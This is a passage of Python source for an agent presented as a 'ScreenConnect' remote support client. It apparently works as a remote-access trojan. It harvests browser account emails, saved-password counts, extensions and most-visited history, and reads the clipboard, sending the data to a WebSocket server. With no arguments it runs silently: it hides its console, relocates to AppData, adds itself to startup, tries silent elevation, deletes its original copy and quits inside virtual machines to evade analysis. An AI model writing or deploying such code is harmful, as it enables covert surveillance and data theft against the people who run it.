                                        cmd, _ = winreg.QueryValueEx(c_key, None)
                                        # Clean path
                                        exe_path = cmd.strip('"').split(' -')[0].strip() # remove args
                                        if not exe_path.lower().endswith(".exe"):
                                            import shlex
                                            try: exe_path = shlex.split(cmd)[0]
                                            except: pass
                                        
                                        abs_path = os.path.abspath(exe_path).lower()
                                        if abs_path in seen_paths or not os.path.exists(exe_path):
                                            continue
                                        
                                        seen_paths.add(abs_path)
                                        is_default = self._check_if_default(b_name, browser_id, default_prog_id)
                                        
                                        browsers.append({
                                            "name": b_name,
                                            "path": exe_path,
                                            "version": "System",
                                            "is_default": is_default
                                        })
                            except Exception: continue
                except Exception: continue

        # 3. Search Common App Paths (Individual browser registration)
        common_exes = ["chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe", "vivaldi.exe"]
        app_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths"
        ]
        for root, _ in reg_roots:
            for sub_base in app_paths:
                for exe in common_exes:
                    try:
                        with winreg.OpenKey(root, f"{sub_base}\\{exe}") as key:
                            exe_path, _ = winreg.QueryValueEx(key, None)
                            abs_path = os.path.abspath(exe_path).lower()
                            if abs_path not in seen_paths and os.path.exists(exe_path):
                                seen_paths.add(abs_path)
                                name = exe.split('.')[0].capitalize()
                                if "msedge" in name.lower(): name = "Microsoft Edge"
                                if "chrome" in name.lower(): name = "Google Chrome"
                                
                                browsers.append({
                                    "name": name,
                                    "path": exe_path,
                                    "version": "Detected",
                                    "is_default": self._check_if_default(name, exe, default_prog_id)
                                })
                    except Exception: continue

        # 4. Always Check Common Installation Folders (Final fallback/redundancy)
        manual_checks = [
            ("Google Chrome", r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
            ("Google Chrome", r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"),
            ("Microsoft Edge", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
            ("Firefox", r"C:\Program Files\Mozilla Firefox\firefox.exe"),
            ("Brave", os.path.join(os.environ.get("LOCALAPPDATA", ""), r"BraveSoftware\Brave-Browser\Application\brave.exe")),
            ("Brave", r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe")
        ]
        for name, path in manual_checks:
            if os.path.exists(path):
                abs_path = os.path.abspath(path).lower()
                if abs_path not in seen_paths:
                    seen_paths.add(abs_path)
                    browsers.append({
                        "name": name,
                        "path": path,
                        "version": "Installed",
                        "is_default": self._check_if_default(name, os.path.basename(path), default_prog_id)
                    })

        return browsers

    def _check_if_default(self, name, id_str, default_prog_id):
        """Logic to match a found browser with the system's default ProgId."""
        if not default_prog_id:
            return False
        
        n = name.lower()
        i = id_str.lower()
        d = default_prog_id.lower()

        # Map common markers
        if "chrome" in d and ("chrome" in n or "chrome" in i): return True
        if "firefox" in d and ("firefox" in n or "firefox" in i): return True
        if "edge" in d and ("edge" in n or "edge" in i): return True
        if "opera" in d and ("opera" in n or "opera" in i): return True
        if "brave" in d and ("brave" in n or "brave" in i): return True
        
        # Generic fallback match
        if d in i or i in d: return True
        return False

    def _handle_browser_profile_request(self, d):
        """Handle request for detailed browser profile forensics."""
        browser_name = d.get("name", "")
        browser_path = d.get("path", "")
        
        profiles = []
        try:
            if "chrome" in browser_name.lower():
                path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data')
                profiles = self._get_chromium_profiles("Google Chrome", path)
            elif "edge" in browser_name.lower():
                path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data')
                profiles = self._get_chromium_profiles("Microsoft Edge", path)
            elif "firefox" in browser_name.lower():
                path = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
                profiles = self._get_firefox_profiles(path)
            
            self._send_json({
                "type": "browser_profile_response",
                "browser": browser_name,
                "profiles": profiles
            })
        except Exception as e:
            logger.error(f"Browser profile error: {e}")
            self._send_json({
                "type": "browser_profile_response",
                "browser": browser_name,
                "error": str(e),
                "profiles": []
            })

    def _get_chromium_profiles(self, browser_name, user_data_path):
        """Harvester for Chromium-based browsers."""
        profiles = []
        if not os.path.exists(user_data_path):
            return []

        # Standard profile folder names
        valid_folders = ["Default"] + [f"Profile {i}" for i in range(1, 20)]
        
        for folder in os.listdir(user_data_path):
            if folder in valid_folders:
                profile_path = os.path.join(user_data_path, folder)
                if os.path.isdir(profile_path):
                    try:
                        p_data = self._parse_chromium_profile(profile_path)
                        p_data["folder"] = folder
                        profiles.append(p_data)
                    except Exception as e:
                        logger.debug(f"Error parsing Chromium profile {folder}: {e}")
        return profiles

    def _parse_chromium_profile(self, profile_path):
        """Extract Identity, Security, and Forensic data from a Chromium profile."""
        details = {
            "name": "Unknown Profile",
            "email": "Not Synced",
            "avatar_url": None,
            "security": {
                "safebrowsing_enabled": False,
                "safebrowsing_enhanced": False,
                "password_count": 0,
                "permissions_count": 0
            },
            "extensions": [],
            "forensics": []
        }

        # 1. Parse Preferences (Identity & Security)
        pref_path = os.path.join(profile_path, "Preferences")
        if os.path.exists(pref_path):
            try:
                with open(pref_path, 'r', encoding='utf-8', errors='ignore') as f:
                    data = json.load(f)
                    
                    # Identity
                    acc = data.get("account_info", [])
                    if acc and isinstance(acc, list):
                        details["email"] = acc[0].get("email", "Not Synced")
                        details["name"] = acc[0].get("given_name", "User")
                        details["avatar_url"] = acc[0].get("picture_url")
                    else:
                        details["name"] = data.get("profile", {}).get("name", "Local Profile")

                    # Security Health Check
                    sb = data.get("safebrowsing", {})
                    details["security"]["safebrowsing_enabled"] = sb.get("enabled", False)
                    details["security"]["safebrowsing_enhanced"] = sb.get("enhanced_protection_enabled", False)
                    
                    # Permissions audit (Camera/Mic)
                    content_settings = data.get("profile", {}).get("content_settings", {}).get("exceptions", {})
                    cam = len(content_settings.get("media_stream_camera", {}))
                    mic = len(content_settings.get("media_stream_mic", {}))
                    details["security"]["permissions_count"] = cam + mic
            except: pass

        # 2. Count Passwords in Login Data (SQLite)
        login_data = os.path.join(profile_path, "Login Data")
        if os.path.exists(login_data):
            try:
                # Copy to temp to avoid locking issues
                temp_db = os.path.join(tempfile.gettempdir(), f"ld_{uuid.uuid4().hex}")
                shutil.copy2(login_data, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM logins")
                details["security"]["password_count"] = cursor.fetchone()[0]
                conn.close()
                os.remove(temp_db)
            except: pass

        # 3. Extensions Inventory
        ext_path = os.path.join(profile_path, "Extensions")
        if os.path.isdir(ext_path):
            for ext_id in os.listdir(ext_path):
                if len(ext_id) == 32: # Standard Chromium extension ID length
                    id_path = os.path.join(ext_path, ext_id)
                    try:
                        # Find versioned folder
                        versions = os.listdir(id_path)
                        if versions:
                            manifest_path = os.path.join(id_path, versions[0], "manifest.json")
                            if os.path.exists(manifest_path):
                                with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as mf:
                                    m_data = json.load(mf)
                                    details["extensions"].append({
                                        "id": ext_id,
                                        "name": m_data.get("name", "Unknown"),
                                        "version": m_data.get("version", "0.0.0")
                                    })
                    except: pass

        # 4. Forensics (Top Sites)
        history_path = os.path.join(profile_path, "History")
        if os.path.exists(history_path):
            try:
                temp_h = os.path.join(tempfile.gettempdir(), f"hi_{uuid.uuid4().hex}")
                shutil.copy2(history_path, temp_h)
                conn = sqlite3.connect(temp_h)
                cursor = conn.cursor()
                # Get Top 5 visited domains
                cursor.execute("""
                    SELECT url, title, visit_count 
                    FROM urls 
                    ORDER BY visit_count DESC 
                    LIMIT 5
                """)
                for row in cursor.fetchall():
                    details["forensics"].append({
                        "url": row[0][:60] + "..." if len(row[0]) > 60 else row[0],
                        "title": row[1] or "No Title",
                        "visits": row[2]
                    })
                conn.close()
                os.remove(temp_h)
            except: pass

        return details

    def _get_firefox_profiles(self, user_data_path):
        """Limited harvester for Firefox (Identity & Extensions)."""
        profiles = []
        if not os.path.exists(user_data_path):
            return []

        for folder in os.listdir(user_data_path):
            profile_path = os.path.join(user_data_path, folder)
            if os.path.isdir(profile_path):
                details = {
                    "folder": folder,
                    "name": folder.split('.')[-1],
                    "email": "Unknown (Firefox)",
                    "security": {"safebrowsing_enabled": True, "password_count": 0},
                    "extensions": [],
                    "forensics": []
                }
                
                # Extensions list
                ext_json = os.path.join(profile_path, "extensions.json")
                if os.path.exists(ext_json):
                    try:
                        with open(ext_json, 'r', encoding='utf-8', errors='ignore') as f:
                            data = json.load(f)
                            for addon in data.get("addons", []):
                                details["extensions"].append({
                                    "id": addon.get("id"),
                                    "name": addon.get("defaultLocale", {}).get("name", "Unknown"),
                                    "version": addon.get("version")
                                })
                    except: pass
                
                profiles.append(details)
        return profiles

    def _handle_clipboard_get(self):
        """Read clipboard content."""
        if not HAS_PYPERCLIP:
            self._send_json({"type": "clipboard_content", "content": "", "error": "pyperclip not installed"})
            return
        try:
            content = pyperclip.paste()
            self._send_json({"type": "clipboard_content", "content": content or ""})
        except Exception as e:
            self._send_json({"type": "clipboard_content", "content": "", "error": str(e)})

    def _handle_clipboard_set(self, d):
        """Write to clipboard."""
        if not HAS_PYPERCLIP:
            self._send_json({"type": "clipboard_set_response", "success": False, "error": "pyperclip not installed"})
            return
        try:
            pyperclip.copy(d.get("content", ""))
            self._send_json({"type": "clipboard_set_response", "success": True})
        except Exception as e:
            self._send_json({"type": "clipboard_set_response", "success": False, "error": str(e)})

    # -- Helpers ---------------------------------------------------------------

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _metric_loop(self):
        """Background thread to sample system metrics without blocking handlers."""
        logger.info("Starting background metric collection")
        # Initialize cpu_percent
        if HAS_PSUTIL:
            psutil.cpu_percent(interval=None)
            
        while self.running:
            try:
                if HAS_PSUTIL:
                    cpu = psutil.cpu_percent(interval=None)
                    mem = psutil.virtual_memory()
                    
                    # Disk info
                    disks = []
                    for part in psutil.disk_partitions(all=False):
                        try:
                            usage = psutil.disk_usage(part.mountpoint)
                            disks.append({
                                "device": part.device,
                                "mountpoint": part.mountpoint,
                                "fstype": part.fstype,
                                "total": usage.total,
                                "used": usage.used,
                                "free": usage.free,
                                "percent": usage.percent,
                            })
                        except: pass
                        
                    # Network
                    nets = []
                    try:
                        for name, addrs in psutil.net_if_addrs().items():
                            for addr in addrs:
                                if addr.family == socket.AF_INET:
                                    nets.append({"name": name, "ip": addr.address})
                    except: pass

                    with self._metrics_lock:
                        self._metrics.update({
                            "cpu_percent": cpu,
                            "memory_total": mem.total,
                            "memory_used": mem.used,
                            "memory_percent": mem.percent,
                            "disks": disks,
                            "network_interfaces": nets,
                            "boot_time": psutil.boot_time(),
                        })
                
                time.sleep(2) # Sample every 2 seconds
            except Exception as e:
                logger.debug(f"Metric loop error: {e}")
                time.sleep(5)

    def _send_json(self, data, timeout=TIMEOUT_SEND):
        if not self.ws or not self.connected:
            return
            
        acquired = self._send_lock.acquire(timeout=timeout if timeout is not None else -1)
        if not acquired:
            return # Skip if we can't get the lock in time
            
        t0 = time.time()
        try:
            if isinstance(data, dict) and "v" not in data:
                data = {**data, "v": PROTOCOL_VERSION}
            self.ws.send(json.dumps(data))
        except Exception as e:
            logger.error(f"Send error: {e}")
        finally:
            self._last_send_duration = time.time() - t0
            self._send_lock.release()

    def _send_binary(self, data, timeout=TIMEOUT_SEND):
        if not self.ws or not self.connected:
            return
            
        acquired = self._send_lock.acquire(timeout=timeout if timeout is not None else -1)
        if not acquired:
            return # Skip if we can't get the lock in time
            
        t0 = time.time()
        try:
            self.ws.send(data, opcode=websocket.ABNF.OPCODE_BINARY)
        except Exception as e:
            logger.error(f"Binary send error: {e}")
        finally:
            self._last_send_duration = time.time() - t0
            self._send_lock.release()


# =============================================================================
# GUI Application
# =============================================================================

class AgentGUI:
    """Simple tkinter GUI for the ScreenConnect client agent."""

    def __init__(self):
        self.agent = None
        self.agent_thread = None

        self.root = tk.Tk()
        self.root.title("ScreenConnect — Remote Support")
        self.root.resizable(False, False)
        self.root.configure(bg="#0f0f13")

        # Center window
        w, h = 480, 420
        x = (self.root.winfo_screenwidth() // 2) - (w // 2)
        y = (self.root.winfo_screenheight() // 2) - (h // 2)
        self.root.geometry(f"{w}x{h}+{x}+{y}")

        # Style
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TLabel", background="#0f0f13", foreground="#e4e4e7",
                        font=("Segoe UI", 10))
        style.configure("Title.TLabel", font=("Segoe UI", 16, "bold"),
                        foreground="#a5b4fc")
        style.configure("Sub.TLabel", font=("Segoe UI", 9),
                        foreground="#71717a")
        style.configure("Status.TLabel", font=("Segoe UI", 10, "bold"),
                        foreground="#22c55e")
        style.configure("TEntry", fieldbackground="#1c1c24",
                        foreground="#e4e4e7", insertcolor="#e4e4e7")
        style.configure("Connect.TButton", font=("Segoe UI", 11, "bold"),
                        padding=(20, 10))
        style.configure("Disconnect.TButton", font=("Segoe UI", 10),
                        padding=(20, 8))

        self._build_ui()
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

    def _build_ui(self):
        main = tk.Frame(self.root, bg="#0f0f13", padx=30, pady=20)
        main.pack(fill="both", expand=True)

        # Title
        ttk.Label(main, text="🖥️  ScreenConnect", style="Title.TLabel").pack(
            pady=(0, 2))
        ttk.Label(main, text="Remote Support Agent", style="Sub.TLabel").pack(
            pady=(0, 20))

        # Server URL
        ttk.Label(main, text="Server URL").pack(anchor="w")
        self.server_var = tk.StringVar(value="ws://localhost:8000")
        self.server_entry = ttk.Entry(main, textvariable=self.server_var,
                                      width=50, font=("Consolas", 10))
        self.server_entry.pack(fill="x", pady=(2, 12))

        # Session ID
        ttk.Label(main, text="Session ID").pack(anchor="w")
        self.session_var = tk.StringVar()
        self.session_entry = ttk.Entry(main, textvariable=self.session_var,
                                       width=50, font=("Consolas", 10))
        self.session_entry.pack(fill="x", pady=(2, 12))

        # Token
        ttk.Label(main, text="Access Token").pack(anchor="w")
        self.token_var = tk.StringVar()
        self.token_entry = ttk.Entry(main, textvariable=self.token_var,
                                     width=50, font=("Consolas", 10))
        self.token_entry.pack(fill="x", pady=(2, 20))

        # Connect button
        self.connect_btn = ttk.Button(main, text="🔗  Connect & Share Screen",
                                      style="Connect.TButton",
                                      command=self._connect)
        self.connect_btn.pack(fill="x", ipady=4)

        # Disconnect button (hidden initially)
        self.disconnect_btn = ttk.Button(main, text="⏹  Disconnect",
                                         style="Disconnect.TButton",
                                         command=self._disconnect)

        # Status
        self.status_var = tk.StringVar(value="Ready — enter connection details above")
        self.status_label = ttk.Label(main, textvariable=self.status_var,
                                      style="Sub.TLabel")
        self.status_label.pack(pady=(16, 0))

    def _connect(self):
        server = self.server_var.get().strip()
        session = self.session_var.get().strip()
        token = self.token_var.get().strip()

        if not server or not session or not token:
            messagebox.showwarning("Missing Info",
                                   "Please fill in all connection fields.")
            return

        # Disable inputs
        self.server_entry.config(state="disabled")
        self.session_entry.config(state="disabled")
        self.token_entry.config(state="disabled")
        self.connect_btn.pack_forget()
        self.disconnect_btn.pack(fill="x", ipady=4)

        self.agent = ScreenConnectAgent(
            server_url=server,
            session_id=session,
            token=token,
            fps=8,
            quality=50,
            max_width=1920,
            on_status=self._update_status,
        )
        self.agent.ui_root = self.root # Assign root for thread-safe UI creation

        self.agent_thread = threading.Thread(target=self.agent.start, daemon=True)
        self.agent_thread.start()

    def _disconnect(self):
        if self.agent:
            self.agent.stop()
        self._reset_ui()

    def _reset_ui(self):
        self.server_entry.config(state="normal")
        self.session_entry.config(state="normal")
        self.token_entry.config(state="normal")
        self.disconnect_btn.pack_forget()
        self.connect_btn.pack(fill="x", ipady=4)
        self._update_status("disconnected", "Ready — enter connection details above")

    def _update_status(self, state, message):
        colors = {
            "connecting": "#f59e0b",
            "connected": "#22c55e",
            "reconnecting": "#f59e0b",
            "disconnected": "#71717a",
            "error": "#ef4444",
            "ended": "#71717a",
        }
        color = colors.get(state, "#71717a")

        def _update():
            self.status_var.set(f"● {message}")
            self.status_label.configure(foreground=color)
            if state in ("ended", "error"):
                self.root.after(2000, self._reset_ui)

        self.root.after(0, _update)

    def _on_close(self):
        if self.agent:
            self.agent.stop()
        self.root.destroy()

    def run(self):
        self.root.mainloop()


# =============================================================================
# CLI Mode
# =============================================================================

def run_cli():
    parser = argparse.ArgumentParser(
        description="ScreenConnect Client Agent v2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--server", required=True, help="WebSocket server URL")
    parser.add_argument("--session", required=True, help="Session UUID")
    parser.add_argument("--token", required=True, help="Session access token")
    parser.add_argument("--fps", type=int, default=8, help="Target FPS (default: 8)")
    parser.add_argument("--quality", type=int, default=50, help="Max JPEG quality (default: 50)")
    parser.add_argument("--max-width", type=int, default=1920, help="Max width (default: 1920)")

    args = parser.parse_args()

    agent = ScreenConnectAgent(
        server_url=args.server,
        session_id=args.session,
        token=args.token,
        fps=args.fps,
        quality=args.quality,
        max_width=args.max_width,
        on_status=lambda state, msg: print(f"[{state.upper()}] {msg}"),
    )

    try:
        agent.start()
    except KeyboardInterrupt:
        agent.stop()
    except Exception as e:
        logger.error(f"Agent error: {e}")
        agent.stop()
        sys.exit(1)


def run_silent(server_url):
    """Run in background without GUI, using bootstrap registration."""
    # 1. Hide console (first thing)
    StealthManager.hide_console()

    # 2. Relocate to AppData and persist
    # If this copy is on Desktop, it will launch the AppData copy and exit.
    # The AppData copy will continue past this point.
    target_path = StealthManager.relocate_agent()
    if target_path:
         StealthManager.add_to_startup(target_path)

    # 3. Mutex check
    # We do THIS AFTER relocation so that the AppData copy waits for the Desktop copy to die.
    StealthManager.prevent_multiple_instances()

    # 4. Silent admin elevation attempt
    StealthManager.elevate_silent()

    # 5. Bootstrap
    agent = ScreenConnectAgent(
        server_url=server_url,
        session_id=None,
        token=None,
        on_status=lambda s, m: logger.info(f"[{s.upper()}] {m}")
    )

    if agent.bootstrap():
        agent.start()
    else:
        logger.error("Silent bootstrap failed. Retrying in 60s...")
        time.sleep(60)
        sys.exit(1)


# =============================================================================
# Entry point
# =============================================================================

if __name__ == "__main__":
    # 0. Handle hidden --no-elevate flag (internal use only)
    if "--no-elevate" in sys.argv:
        try:
            sys.argv.remove("--no-elevate")
        except ValueError: pass

    # 1. Smart Elevation (UAC Prompt)
    # This happens BEFORE relocation so we can relocate WITH admin rights.
    StealthManager.auto_elevate()

    # 2. Check for cleanup request (self-deletion of original desktop EXE)
    # Strip --cleanup and its path from sys.argv so they don't interfere
    # with the CLI vs silent mode decision below.
    if "--cleanup" in sys.argv:
        try:
            cleanup_idx = sys.argv.index("--cleanup")
            if cleanup_idx + 1 < len(sys.argv):
                cleanup_path = sys.argv[cleanup_idx + 1]
                # Remove both --cleanup and the path from argv
                sys.argv.pop(cleanup_idx + 1)
                sys.argv.pop(cleanup_idx)

                def _do_cleanup():
                    # Wait more aggressively
                    time.sleep(10)
                    try:
                        if os.path.exists(cleanup_path):
                            # Try multiple times to delete it
                            for i in range(10):
                                try:
                                    os.remove(cleanup_path)
                                    logger.info(f"Cleaned up original: {cleanup_path}")
                                    break
                                except:
                                    time.sleep(2)
                    except Exception as e:
                        logger.error(f"Cleanup thread failed: {e}")
                threading.Thread(target=_do_cleanup, daemon=True).start()
            else:
                # --cleanup without a path, just remove the flag
                sys.argv.pop(cleanup_idx)
        except Exception:
            pass

    # Check for VM and self-destruct if detected
    if StealthManager.check_vm():
        logger.warning("VM Detected. Terminating.")
        sys.exit(0)

    # Entry decision:
    # 1. If CLI arguments are passed (--server, etc.), run CLI mode.
    # 2. If NO arguments, run SILENT mode (auto-register).
    if len(sys.argv) > 1:
        run_cli()
    else:
        run_silent(DEFAULT_SERVER_URL)
